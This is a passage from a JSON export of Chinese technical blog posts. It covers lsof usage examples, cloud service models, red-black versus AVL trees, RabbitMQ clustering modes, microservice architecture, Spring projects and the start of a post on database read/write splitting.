8,0 26254 765 /usr/lib64/gconv/gconv-modules.cachemysqld_sa 11709 mysql 0r CHR 1,3 0t0 16097 /dev/nullmysqld_sa 11709 mysql 1w CHR 1,3 0t0 16097 /dev/nullmysqld_sa 11709 mysql 2w CHR 1,3 0t0 16097 /dev/nullmysqld_sa 11709 mysql 255r REG 8,0 26991 1284 /usr/bin/mysqld_safemysqld 11885 mysql cwd DIR 8,0 4096 246921 /var/lib/mysqlmysqld 11885 mysql rtd DIR 8,0 4096 2 /mysqld 11885 mysql txt REG 8,0 14311936 1320 /usr/libexec/mysqld... -c 选项将会列出所有正在被mysql这个进程使用的文件，其实你也可以写成 lsof | grep mysql, 但是第一种方法明显比第二种方法要少打几个字符； 实例 4- 列出某个用户以及某个进程所打开的文件信息1$ lsof -u test -c mysql 实例 5 - 通过某个进程号显示该进程打开的文件1$ lsof -p 11968 实例 6 - 通过某个进程号显示该进程打开的文件1$ lsof -p 11968 实例 7 - 列出所有的网络连接1$ lsof -i 实例 8 - 列出所有tcp 网络连接信息123456$ lsof -i tcp$lsof -n -i tcpCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEsvnserve 11552 weber 3u IPv4 3799399 0t0 TCP *:svn (LISTEN)redis-ser 25501 weber 4u IPv4 113150 0t0 TCP 127.0.0.1:6379 (LISTEN) 实例 9 - 列出谁在使用某个端口1$ lsof -i :3306 列出所有tcp 网络连接信息 1$ lsof -i tcp 列出所有udp网络连接信息 1$ lsof -i udp 列出谁在使用某个特定的udp端口 1$ lsof -i udp:55 特定的tcp端口 1$ lsof -i tcp:80 列出某个用户的所有活跃的网络端口 1$ lsof -a -u test -i 实例 10 - 列出某个用户的所有活跃的网络端口1$ lsof -a -u test -i 实例 11 - 递归查看某个目录的文件信息1$ lsof +D /filepath/filepath2/ 备注: 使用了+D，对应目录下的所有子目录和文件都会被列出 比使用+D选项，遍历查看某个目录的所有文件信息 的方法 1$ lsof | grep ‘/filepath/filepath2/’ Reference https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/lsof.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Distributed System】云计算（Cloud Computing）","date":"2019-08-01T07:22:56.000Z","path":"2019/08/01/【Distributed-System】云计算/","text":"云计算（Cloud Computing）我们对于云计算的概念，维基百科有以下定义：Cloud computing is a new form of Internet-based computing that provides shared computer processing resources and data to computers and other devices on demand. 云计算就是一种按照需求通过Internet获取计算资源的形态。这些计算资源被包装成为服务，提供给用户。而提供这些服务的主体，我们称之为云服务供应商（Cloud Service Provider）。 按照NIST (National Institute of Standards and Technology，美国国家标准和技术研究院)的定义，云服务最主要的有三类：IaaS、PaaS、SaaS。 IaaS（Infrastructure as a service – 基础设施即服务）IaaS（Infrastructure as a Service），即“基础设施即服务”，一般指云计算所提供的计算、存储、网络等基本底层能力。 用户没有权限管理和访问底层的基础设施，如服务器、交换机、硬盘等，但是有权管理操作系统、存储内容，可以安装管理应用程序，甚至是有权管理网络组件。简单的说用户使用IaaS，有权管理操作系统之上的一切功能。 我们常见的IaaS服务有虚拟机、虚拟网络、以及存储。 IaaS 的本质，是对云数据中心和各类 IT 基础设施的抽象，是基于软件技术对物理硬件进行的封装和虚拟。这为云计算用户屏蔽了大量底层细节，能让我们在较高的层面进行架构设计和资源使用，大大提高了工作效率。 PaaS（Platform as a service – 平台即服务）PaaS（Platform as a Service），即“平台即服务”，通常指基于云底层能力而构建的面向领域或场景的高层服务，如数据库、应用服务等。 用户无需管理底层的基础设施，包括网络、服务器，操作系统或者存储。他们只能控制部署在基础设施中操作系统上的应用程序，配置应用程序所托管的环境的可配置参数。 常见的PaaS服务有数据库服务、Web应用以及容器服务。 SaaS（Software as a Service – 软件即服务）SaaS给用户提供的能力是使用在云基础架构上运行的云服务提供商的应用程序。可以通过轻量的客户端接口（诸如web浏览器（例如，基于web的电子邮件））或程序接口从各种客户端设备访问应用程序。 用户无需管理或控制底层云基础架构，包括网络，服务器，操作系统，存储甚至单独的应用程序功能，可能的例外是有限的用户特定应用程序配置设置。 类似的服务有：各类的网盘(Dropbox、百度网盘等)，JIRA，GitLab等服务。而这些应用的提供者不仅仅是云服务提供商，还有众多的第三方提供商（ISV: independent software provider）。 例子这里借用汽车的例子对IaaS、PaaS、SaaS的解释进一步阐述三者的区别。假设你需要出去外出使用交通工具，我们有四种的方案： On-premise方案： 自己开车，需要维护汽车，是其安全工作。同时需要为车上保险，提供燃料。（服务器 + 操作系统/数据库 + 应用软件） IaaS: 从租车公司租一辆车，汽车的维修、安检都由租车公司承担。你只需要提供燃料（需要提供操作系统+应用软件） PaaS: 除了基础设施（汽车），还为你提供司机。类似出租车。只需要提供目的地，汽车的行驶和运行都有司机决定。（只需要提供应用软件）。 SaaS: 类似于做轨道交通， 一切都是由别人控制。只有较少的定制化功能。 目前主流的IaaS、PaaS和SaaS产品如下图所示： 部署模式除此之外，云计算目前主流的部署模式分为三类： 私有云（Private Cloud / On Premise）私有云是专为单个组织运营的云基础架构，管理的模式有内部管理，第三方管理，亦或是内部或外部托管。简单的讲，私有云就是通过自建或者租用场地的形式建立服务器机房或者数据中心。服务是面向私有网络或者VPN专有网络。企业拥有对服务器、数据硬盘的完全控制。因此安全性很高。 公有云（Public Cloud）公有云服务面向公开网络暴露，服务可能也是免费的。由于网络对外公布，因此从安全层面上也是大不相同的。常见的公有云有AWS，Microsoft Azure，阿里云等。 混合云（Hybrid Cloud）混合云是两个或多个云（私有云，社区云或公共云）的组合，它们保持不同的实体但绑定在一起，提供多个部署模型的好处。 混合云还意味着能够使用云资源连接搭配，托管和/或专用服务。比较常见的例子如数据公司，可能拥有很多数据，而这些数据因为合规性等原因只能放在私有环境，当需要大规模机器学习，对数据进行脱敏后使用公有云进行大规模学习。 IaaS（Infrastructure as a service – 基础设施即服务）虚拟机类型一般来讲，云厂商会提供通用均衡型、计算密集型、内存优化型、图形计算型等常见的虚拟机类型。这些类型对应着硬件资源的某种合理配比或针对性强化，方便你在面向不同场景时，选择最合适的那个型号。 而 vCPU 数和内存大小（按 GB 计算）的比例，是决定和区分虚拟机类型的重要指征之一。 通用均衡型的比例通常是 1:4，如 2 核 8G，这是一个经典的搭配，可用于建站、应用服务等各种常见负载，比如作为官网和企业应用程序的后端服务器等。如果你对未来工作负载的特征还没有经验和把握，那你也可以先使用通用型实例，等程序运行一段时间后再根据资源占用情况按需调整。 如果 vCPU 和内存比是 1:2 甚至 1:1，那就是计算密集型的范畴，它可以用于进行科学计算、视频编码、代码编译等计算密集型负载。 比例为 1:8 及以上，一般就会被归入内存优化型了，比如 8 核 64G 的搭配，它在数据库、缓存服务、大数据分析等应用场景较为常见。 图形计算型很好理解，就是带有 GPU 能力的虚拟机，一般用于机器学习和深度学习模型的训练和推理。随着 AI 的火热，这类机器也越来越多地出现在各种研发和生产环境中。 流量分类区域的流量费用，是你需要注意的。如果把区域作为一个有边界范围的实体圈起来，这个流量可以分为三类： 入站流量 出站流量 内部流量 云解决高可用性一个区域看上去拥有一个数据中心就足够了，为什么还要建造多个可用区呢？ 首要的原因，当然是为了解决区域内高可用性问题，这也正是“可用区”名字的由来。尽管数据中心内部有着非常精密的运作系统和冗余机制，但地震、火灾、雷击等极端情况下，仍有可能造成数据中心级别的故障。 为了避免单个数据中心故障让整个区域不可用，那自然就有必要建设多个相对独立的数据中心，也就是多个可用区了。它能让区域中的服务达到相当高的可用性。许多云上的 PaaS 服务，正是依赖多可用区，来建设架构并保证冗余的。 PaaS（Platform as a service – 平台即服务）什么是 PaaS？在 IaaS 篇中，我们主要是侧重于基础设施类的云服务，尤其是虚拟机、云磁盘、云网络等服务。它们的特点是，和传统 IT 基础设施往往有一个对应关系，所以被称为基础设施即服务（Infrastructure-as-a-Service）。 今天我们的主角 PaaS （Platform-as-a-Service），则是指云计算提供的平台类服务，在这些平台的基础上，用户可以直接开发、运行、管理应用程序，而无需构建和维护底层的基础设施。 用更通俗的话来说，PaaS 是在 IaaS 的基础上又做了许多工作，构建了很多关键抽象和可复用的单元，让我们用户能够在更上层进行应用的构建，把更多精力放在业务逻辑上。 拿房子装修来打个比方的话，IaaS 就好像空空如也的毛坯房，我们还需要操心墙面、地板等基础性工作；而 PaaS 就好比精装修的房子，我们只要搬入自己喜欢的家具（业务逻辑），再适当装饰就可以“拎包入住”，开始美好生活了。 小提示：PaaS 本身也是基于底层 IaaS 构建出来的，使用了云上的各种基础设施。只是这个步骤云服务提供商代替我们用户完成了，还进行了一定程度的封装。 当然，随着 PaaS 服务形态种类的增多、边界的不断扩展，除了那些包含语言运行环境、可编程和可扩展的经典 PaaS 服务之外，还有更多的在云上用来辅助应用构建，或帮助运维的服务，也归入了广义上 PaaS 的范畴。这也是有道理的，因为它们同样是完整的现代应用程序生态的一部分。 对象存储通俗地解释起来，你可以这样理解，对象存储是你在云上可以创建的一种“网盘”。这个网盘可以存储任意的二进制文件，包括结构化和非结构化数据。你可以随时上传下载，也可以修改和删除。当然，云上对象存储会保证你数据的可靠性、可用性和扩展性，你不需要操心这些细节。 对象存储的高级特性存储分层在生产环境下的对象存储，我们往往会存放大量的文件和数据，这些文件的访问频率其实是会有很大差异的。比如说，对于一些比较热门的下载文件，它可能经常需要被访问调用；而如果是一些明细的日志文件，写入后再次读取的机率通常不高，只有当排查问题时，我们才可能去访问翻看它。 所以为了应对不同的访问模式和频率，对象存储贴心地提供了分层的策略，你可以按照访问热度，设置从热到冷不同的存储级别（或者叫存储类型）。其中，存储级别为热的对象，存储空间占用的成本稍高，但访问读取不需要收取额外的费用；而存储级别越冷，则存储空间的单位成本越低，但访问读取需要收取一定的费用。到了极少访问的存档级别，数据的“解冻”可能还需要花费一些时间。 生命周期管理随着时间的推移、业务的增长，你在对象存储中的内容肯定会越来越多。当总的体量和对象的个数到达一定级别的时候，你会发现对历史内容进行清理就成为了一件非常麻烦的事情。 这时候，生命周期管理功能就可以很好地帮助我们。因为它允许你设置一定的过期规则，当对象满足规则时（通常每天判断一次），可以自动地执行一些清理操作。比如，你可以对一个存储桶或目录进行设置，要求最后修改时间超过 60 天的文件自动切换到低频访问层，超过 180 天的文件则进行归档或删除。 版本管理云上的关系型数据库云数据库和传统数据库有很大的区别，这是指在搭建、运维、管理层面，云数据库提升了一个层次，实现了相当程度的智能化和自动化，极大地提升了用户友好度，降低了使用门槛。比如灵活的性能等级调整、详尽的监控体系、攻击防护机制等等，这些许多在传统数据库中需要借助额外工具或产品的功能，在云数据库服务是默认内置，可以开箱即用的。 读写分离：当并发数量上升时，关系型数据库容易出现性能瓶颈。这时比较有用的办法，就是实现基于多库同步的读写分离。读写分离虽然是常见的架构思路，但你要是不熟悉细节的话，手工配置起来可并没有那么容易。 新一代云原生数据库Reference 怎么理解 IaaS、SaaS 和 PaaS 的区别？ - https://www.zhihu.com/question/20387284/answer/743669668 https://time.geekbang.org/column/article/206253","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Data Structure】树 - 平衡二叉搜索树 - 有了二叉查找树、AVL 树为啥还需要红黑树？","date":"2019-08-01T04:36:52.000Z","path":"2019/08/01/【Data-Structure】树-平衡二叉搜索树-有了二叉查找树、AVL-树为啥还需要红黑树？/","text":"二叉查找树的缺点二叉查找树，相信大家都接触过，二叉查找树的特点就是左子树的节点值比父亲节点小，而右子树的节点值比父亲节点大，如图： 基于二叉查找树的这种特点，我们在查找某个节点的时候，可以采取类似于二分查找的思想，快速找到某个节点。n 个节点的二叉查找树，正常的情况下，查找的时间复杂度为 $O(log_2n)$。 之所以说是正常情况下，是因为二叉查找树有可能出现一种极端的情况，例如 这种情况也是满足二叉查找树的条件，然而，此时的二叉查找树已经近似退化为一条链表，这样的二叉查找树的查找时间复杂度顿时变成了 O(n)，可想而知，我们必须不能让这种情况发生，为了解决这个问题，于是我们引申出了平衡二叉树。 平衡二叉树平衡二叉树就是为了解决二叉查找树退化成一颗链表而诞生了，平衡树具有如下特点： 具有二叉查找树的全部特性。 每个节点的左子树和右子树的高度差至多等于1。 例如：图一就是一颗平衡树了，而图二则不是(节点右边标的是这个节点的高度) 。 对于图二，因为节点9的左孩子高度为2，而右孩子高度为0。他们之间的差值超过1了。 平衡树基于这种特点就可以保证不会出现大量节点偏向于一边的情况了。 于是，通过平衡树，我们解决了二叉查找树的缺点。对于有 n 个节点的平衡树，最坏的查找时间复杂度也为 $O(log_2n)$。 为什么有了平衡树还需要红黑树？虽然平衡树解决了二叉查找树退化为近似链表的缺点，能够把查找时间控制在 $O(log_2n)$，不过却不是最佳的，因为平衡树要求每个节点的左子树和右子树的高度差至多等于1，这个要求实在是太严了，导致每次进行插入/删除节点的时候，几乎都会破坏平衡树的第二个规则，进而我们都需要通过左旋和右旋来进行调整，使之再次成为一颗符合要求的平衡树。 显然，如果在那种插入、删除很频繁的场景中，平衡树需要频繁着进行调整，这会使平衡树的性能大打折扣，为了解决这个问题，于是有了红黑树，红黑树具有如下特点： 1、具有二叉查找树的特点。 2、根节点是黑色的； 3、每个叶子节点都是黑色的空节点（NIL），也就是说，叶子节点不存数据。 4、任何相邻的节点都不能同时为红色，也就是说，红色节点是被黑色节点隔开的。 5、每个节点，从该节点到达其可达的叶子节点是所有路径，都包含相同数目的黑色节点。 例如下面的图片（注意，图片中黑色的、空的叶子节点没有画出）： 正是由于红黑树的这种特点，使得它能够在最坏情况下，也能在 $O(log_2n)$ 的时间复杂度查找到某个节点。 不过，与平衡树不同的是，红黑树在插入、删除等操作，不会像平衡树那样，频繁着破坏红黑树的规则，所以不需要频繁着调整，这也是我们为什么大多数情况下使用红黑树的原因。 不过，如果你要说，单单在查找方面的效率的话，平衡树比红黑树快。 所以，我们也可以说，红黑树是一种不大严格的平衡树。也可以说是一个折中发方案。 如果我上面讲的，你都懂，都能够在面试中说出来，应该是足够的了。我当时就是这么回答的。 总结所以，最后的答案是，平衡树是为了解决二叉查找树退化为链表的情况，而红黑树是为了解决平衡树在插入、删除等操作需要频繁调整的情况。 不过，红黑树还有挺多其他的知识点可以考，例如红黑树有哪些应用场景？向集合容器中 HashMap，TreeMap 等，内部结构就用到了红黑树了。还有构建一棵节点个数为 n 的红黑树，时间复杂度是多少？红黑树与哈希表在不同应该场景的选择？红黑树有哪些性质？红黑树各种操作的时间复杂度是多少？ Reference 记一次腾讯面试：有了二叉查找树、平衡树（AVL）为啥还需要红黑树？ - https://zhuanlan.zhihu.com/p/72505589","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Distributed System】消息队列-RabbitMQ","date":"2019-08-01T04:24:34.000Z","path":"2019/08/01/【Distributed-System】消息队列-RabbitMQ/","text":"怎么保证MQ的高可用特性？使用了MQ之后，我们肯定是希望MQ有高可用特性，因为不可能接受机器宕机了，就无法收发消息的情况。 这一块我们也是基于RabbitMQ这种经典的MQ来说明一下： RabbitMQ是比较有代表性的，因为是基于主从做高可用性的，我们就以他为例子讲解第一种MQ的高可用性怎么实现。 rabbitmq有三种模式： 单机模式 普通集群模式 镜像集群模式 单机模式单机模式就是demo级别的，就是说只有一台机器部署了一个RabbitMQ程序。 这个会存在单点问题，宕机就玩完了，没什么高可用性可言。一般就是你本地启动了玩玩儿的，没人生产用单机模式。 普通集群模式这个模式的意思就是在多台机器上启动多个rabbitmq实例。类似的master-slave模式一样。 但是创建的queue，只会放在一个master rabbtimq实例上，其他实例都同步那个接收消息的RabbitMQ元数据。 在消费消息的时候，如果你连接到的RabbitMQ实例不是存放Queue数据的实例，这个时候RabbitMQ就会从存放Queue数据的实例上拉去数据，然后返回给客户端。 总的来说，这种方式有点麻烦，没有做到真正的分布式，每次消费者连接一个实例后拉取数据，如果连接到不是存放queue数据的实例，这个时候会造成额外的性能开销。如果从放Queue的实例拉取，会导致单实例性能瓶颈。 如果放queue的实例宕机了，会导致其他实例无法拉取数据，这个集群都无法消费消息了，没有做到真正的高可用。 所以这个事儿就比较尴尬了，这就没有什么所谓的高可用性可言了，这方案主要是提高吞吐量的，就是说让集群中多个节点来服务某个queue的读写操作。 镜像集群模式镜像集群模式才是真正的rabbitmq的高可用模式，跟普通集群模式不一样的是：创建的queue无论元数据还是queue里的消息都会存在于多个实例上， 每次写消息到queue的时候，都会自动把消息到多个实例的queue里进行消息同步。 这样的话任何一个机器宕机了别的实例都可以用提供服务，这样就做到了真正的高可用了。 但是也存在着不好之处： 性能开销过高，消息需要同步所有机器，会导致网络带宽压力和消耗很重 扩展性低：无法解决某个queue数据量特别大的情况，导致queue无法线性拓展。就算加了机器，那个机器也会包含queue的所有数据，queue的数据没有做到分布式存储。 对于RabbitMQ的高可用一般的做法都是开启镜像集群模式，这样起码来说做到了高可用，一个节点宕机了，其他节点可以继续提供服务。 Reference 90%的Java程序员，都扛不住这波消息中间件的面试四连炮！ - https://zhuanlan.zhihu.com/p/72728396","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】微服务（Microservice Architecture）","date":"2019-07-31T14:30:51.000Z","path":"2019/07/31/【Distributed-System】微服务/","text":"传统的Web开发方式先来看看传统的web开发方式，通过对比比较容易理解什么是Microservice Architecture。和Microservice相对应的，这种方式一般被称为Monolithic（比较难传神的翻译）。所有的功能打包在一个 WAR包里，基本没有外部依赖（除了容器），部署在一个JEE容器（Tomcat，JBoss，WebLogic）里，包含了 DO/DAO，Service，UI等所有逻辑。 Monolithic比较适合小项目，优点是： 1、开发简单直接，集中式管理 2、基本不会重复开发 3、功能都在本地，没有分布式的管理开销和调用开销 它的缺点也非常明显，特别对于互联网公司来说（不一一列举了）： 1、开发效率低：所有的开发在一个项目改代码，递交代码相互等待，代码冲突不断 2、代码维护难：代码功能耦合在一起，新人不知道何从下手 3、部署不灵活：构建时间长，任何小修改必须重新构建整个项目，这个过程往往很长 4、稳定性不高：一个微不足道的小问题，可以导致整个应用挂掉 5、扩展性不够：无法满足高并发情况下的业务需求 Microservice Architecture所以，现在主流的设计一般会采用Microservice Architecture，就是基于微服务的架构。简单来说，微服务的目的是有效的拆分应用，实现敏捷开发和部署。 SOA vs Microservice除了Smart endpoints and dumb pipes都很容易理解对吗？相信很多人都会问一个问题，这是不是就是SOA换了个概念，挂羊头卖狗肉啊，有说法把Microservice叫成 Lightway SOA。也有很多传统砖家跳出来说Microservice就是SOA。其实Martin也没否认SOA和Microservice的关系。 我个人理解，Microservice是SOA的传承，但一个最本质的区别就在于Smart endpoints and dumb pipes，或者说是真正的分布式的、去中心化的。Smart endpoints and dumb pipes本质就是去ESB，把所有的“思考”逻辑包括路由、消息解析等放在服务内部（Smart endpoints），去掉一个大一统的ESB，服务间轻（dumb pipes）通信，是比SOA更彻底的拆分。 HOW - 怎么具体实践微服务听上去好像都不错，具体怎么落地啊？这需要回答下面几个问题： 1、客户端如何访问这些服务？ 2、服务之间如何通信？ 3、这么多服务，怎么找? 4、服务挂了怎么办？ 5、客户端如何访问这些服务？ 原来的Monolithic方式开发，所有的服务都是本地的，UI可以直接调用，现在按功能拆分成独立的服务，跑在独立的一般都在独立的虚拟机上的 Java进程了。客户端UI如何访问他的？后台有N个服务，前台就需要记住管理N个服务，一个服务下线/更新/升级，前台就要重新部署，这明显不服务我们 拆分的理念，特别当前台是移动应用的时候，通常业务变化的节奏更快。另外，N个小服务的调用也是一个不小的网络开销。还有一般微服务在系统内部，通常是无状态的，用户登录信息和权限管理最好有一个统一的地方维护管理（OAuth）。 所以，一般在后台N个服务和UI之间一般会一个代理或者叫API Gateway，他的作用包括 1、提供统一服务入口，让微服务对前台透明 2、聚合后台的服务，节省流量，提升性能 3、提供安全，过滤，流控等API管理功能 我的理解其实这个API Gateway可以有很多广义的实现办法，可以是一个软硬一体的盒子，也可以是一个简单的MVC框架，甚至是一个Node.js的服务端。他们最重要的作 用是为前台（通常是移动应用）提供后台服务的聚合，提供一个统一的服务出口，解除他们之间的耦合，不过API Gateway也有可能成为单点故障点或者性能的瓶颈。 一般用过Taobao Open Platform的就能很容易的体会，TAO就是这个API Gateway。 服务之间如何通信？因为所有的微服务都是独立的Java进程跑在独立的虚拟机上，所以服务间的通行就是IPC（inter process communication），已经有很多成熟的方案。现在基本最通用的有两种方式。这几种方式，展开来讲都可以写本书，而且大家一般都比较熟悉细节了， 就不展开讲了。 1、同步调用 2、REST（JAX-RS，Spring Boot） 3、RPC（Thrift, Dubbo） 4、异步消息调用(Kafka, Notify, MetaQ) 一般同步调用比较简单，一致性强，但是容易出调用问题，性能体验上也会差些，特别是调用层次多的时候。RESTful和RPC的比较也是一个很有意 思的话题。 一般REST基于HTTP，更容易实现，更容易被接受，服务端实现技术也更灵活些，各个语言都能支持，同时能跨客户端，对客户端没有特殊的要 求，只要封装了HTTP的SDK就能调用，所以相对使用的广一些。RPC也有自己的优点，传输协议更高效，安全更可控，特别在一个公司内部，如果有统一个 的开发规范和统一的服务框架时，他的开发效率优势更明显些。就看各自的技术积累实际条件，自己的选择了。 而异步消息的方式在分布式系统中有特别广泛的应用，他既能减低调用服务之间的耦合，又能成为调用之间的缓冲，确保消息积压不会冲垮被调用方，同时能 保证调用方的服务体验，继续干自己该干的活，不至于被后台性能拖慢。 不过需要付出的代价是一致性的减弱，需要接受数据最终一致性；还有就是后台服务一般要 实现幂等性，因为消息发送出于性能的考虑一般会有重复（保证消息的被收到且仅收到一次对性能是很大的考验）；最后就是必须引入一个独立的broker，如 果公司内部没有技术积累，对broker分布式管理也是一个很大的挑战。 这么多服务，怎么找?在微服务架构中，一般每一个服务都是有多个拷贝，来做负载均衡。一个服务随时可能下线，也可能应对临时访问压力增加新的服务节点。服务之间如何相互 感知？服务如何管理？这就是服务发现的问题了。 一般有两类做法，也各有优缺点。基本都是通过zookeeper等类似技术做服务注册信息的分布式管理。当 服务上线时，服务提供者将自己的服务信息注册到ZK（或类似框架），并通过心跳维持长链接，实时更新链接信息。服务调用者通过ZK寻址，根据可定制算法， 找到一个服务，还可以将服务信息缓存在本地以提高性能。当服务下线时，ZK会发通知给服务客户端。 1、客户端做：优点是架构简单，扩展灵活，只对服务注册器依赖。缺点是客户端要维护所有调用服务的地址，有技术难度，一般大公司都有成熟的内部框架支持，比如Dubbo。 2、服务端做：优点是简单，所有服务对于前台调用方透明，一般在小公司在云服务上部署的应用采用的比较多。 这么多服务，服务挂了怎么办？ 前面提到，Monolithic方式开发一个很大的风险是，把所有鸡蛋放在一个篮子里，一荣俱荣，一损俱损。而分布式最大的特性就是网络是不可靠 的。通过微服务拆分能降低这个风险，不过如果没有特别的保障，结局肯定是噩梦。 我们刚遇到一个线上故障就是一个很不起眼的SQL计数功能，在访问量上升 时，导致数据库load彪高，影响了所在应用的性能，从而影响所有调用这个应用服务的前台应用。所以当我们的系统是由一系列的服务调用链组成的时候，我们 必须确保任一环节出问题都不至于影响整体链路。相应的手段有很多： 1、重试机制 2、限流 3、熔断机制 4、负载均衡 5、降级（本地缓存） 这些方法基本上都很明确通用，就不详细说明了。 WHY - 微服务的应用 这里有一个图非常好的总结微服务架构需要考虑的问题，包括 1、API Gateway 2、服务间调用 3、服务发现 4、服务容错 5、服务部署 6、数据调用 微服务的优点和缺点微服务的优点和缺点（或者说挑战）一样明显。 1、优点 2、开发简单 3、技术栈灵活 4、服务独立无依赖 5、独立按需扩展 6、可用性高 7、缺点（挑战） 8、多服务运维难度 9、系统部署依赖 10、服务间通信成本 11、数据一致性 12、系统集成测试 13、重复工作 14、性能监控 Reference 基于Spring Boot+Cloud构建微云架构 - https://mp.weixin.qq.com/s/3pt-jhSKwtgKHnfMeHX-GA","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Spring】Spring 框架","date":"2019-07-31T14:24:01.000Z","path":"2019/07/31/【Spring】Spring-框架/","text":"Spring 顶级框架谈及微服务，作为当前主流的企业框架Spring，它提供了一整套相关的顶级项目，能让开发者快速的上手实现自己的应用，今天就介绍下Spring旗下各个顶级项目： Spring IO platform:用于系统部署，是可集成的，构建现代化应用的版本平台，具体来说当你使用maven dependency引入spring jar包时它就在工作了。 Spring Boot:旨在简化创建产品级的 Spring 应用和服务，简化了配置文件，使用嵌入式web服务器，含有诸多开箱即用微服务功能，可以和spring cloud联合部署。 Spring Framework:即通常所说的spring 框架，是一个开源的Java/Java EE全功能栈应用程序框架，其它spring项目如spring boot也依赖于此框架。 Spring Cloud：微服务工具包，为开发者提供了在分布式系统的配置管理、服务发现、断路器、智能路由、微代理、控制总线等开发工具包。 Spring XD：是一种运行时环境（服务器软件，非开发框架），组合spring技术，如spring batch、spring boot、spring data，采集大数据并处理。 Spring Data：是一个数据访问及操作的工具包，封装了很多种数据及数据库的访问相关技术，包括：jdbc、Redis、MongoDB、Neo4j等。 Spring Batch：批处理框架，或说是批量任务执行管理器，功能包括任务调度、日志记录/跟踪等。 Spring Security：是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。 Spring Integration：面向企业应用集成（EAI/ESB）的编程框架，支持的通信方式包括HTTP、FTP、TCP/UDP、JMS、RabbitMQ、Email等。 Spring Social：一组工具包，一组连接社交服务API，如Twitter、Facebook、LinkedIn、GitHub等，有几十个。 Spring AMQP：消息队列操作的工具包，主要是封装了RabbitMQ的操作。 Spring HATEOAS：是一个用于支持实现超文本驱动的 REST Web 服务的开发库。 Spring Mobile：是Spring MVC的扩展，用来简化手机上的Web应用开发。 Spring for Android：是Spring框架的一个扩展，其主要目的在乎简化Android本地应用的开发，提供RestTemplate来访问Rest服务。 Spring Web Flow：目标是成为管理Web应用页面流程的最佳方案，将页面跳转流程单独管理，并可配置。 Spring LDAP：是一个用于操作LDAP的Java工具包，基于Spring的JdbcTemplate模式，简化LDAP访问。 Spring Session：session管理的开发工具包，让你可以把session保存到redis等，进行集群化session管理。 Spring Web Services：是基于Spring的Web服务框架，提供SOAP服务开发，允许通过多种方式创建Web服务。 Spring Shell：提供交互式的Shell可让你使用简单的基于Spring的编程模型来开发命令，比如Spring Roo命令。 Spring Roo：是一种Spring开发的辅助工具，使用命令行操作来生成自动化项目，操作非常类似于Rails。 Spring Scala：为Scala语言编程提供的spring框架的封装（新的编程语言，Java平台的Scala于2003年底/2004年初发布）。 Spring BlazeDS Integration：一个开发RIA工具包，可以集成Adobe Flex、BlazeDS、Spring以及Java技术创建RIA。 Spring Loaded：用于实现java程序和web应用的热部署的开源工具。 Spring REST Shell：可以调用Rest服务的命令行工具，敲命令行操作Rest服务。 Spring cloud子项目目前来说spring主要集中于spring boot（用于开发微服务）和spring cloud相关框架的开发，我们从几张图着手理解，然后再具体介绍： spring cloud子项目包括： Spring Cloud Config：配置管理开发工具包，可以让你把配置放到远程服务器，目前支持本地存储、Git以及Subversion。 Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与Spring Cloud Config联合实现热部署。 Spring Cloud Netflix：针对多种Netflix组件提供的开发工具包，其中包括Eureka、Hystrix、Zuul、Archaius等。 Netflix Eureka：云端负载均衡，一个基于 REST 的服务，用于定位服务，以实现云端的负载均衡和中间层服务器的故障转移。 Netflix Hystrix：容错管理工具，旨在通过控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。 Netflix Zuul：边缘服务工具，是提供动态路由，监控，弹性，安全等的边缘服务。 Netflix Archaius：配置管理API，包含一系列配置管理API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能。 Spring Cloud for Cloud Foundry：通过Oauth2协议绑定服务到CloudFoundry，CloudFoundry是VMware推出的开源PaaS云平台。 Spring Cloud Sleuth：日志收集工具包，封装了Dapper,Zipkin和HTrace操作。 Spring Cloud Data Flow：大数据操作工具，通过命令行方式操作数据流。 Spring Cloud Security：安全工具包，为你的应用程序添加安全控制，主要是指OAuth2。 Spring Cloud Consul：封装了Consul操作，consul是一个服务发现与配置工具，与Docker容器可以无缝集成。 Spring Cloud Zookeeper：操作Zookeeper的工具包，用于使用zookeeper方式的服务注册和发现。 Spring Cloud Stream：数据流操作开发包，封装了与Redis,Rabbit、Kafka等发送接收消息。 Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件。 Reference 基于Spring Boot+Cloud构建微云架构 - https://mp.weixin.qq.com/s/3pt-jhSKwtgKHnfMeHX-GA","comments":true,"categories":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"http://swsmile.info/tags/Spring/"}]},{"title":"【Database】读写分离（Read/Write Splitting）","date":"2019-07-31T14:19:07.000Z","path":"2019/07/31/【Database】读写分离/","text":"读写分离（Read/Write Splitting）+ 主从复制（Master-slave Replication）读写分离（Read/Write Splitting）的基本思想：让集群中的主数据库负责增（insert）、删（delete）和改（update）事务操作，而集群中的从数据库负责查询操作（select）；并且，数据库后台会自动将因在主数据库中进行的事务操作导致的数据变更，同步到集群中的各个从数据库中。 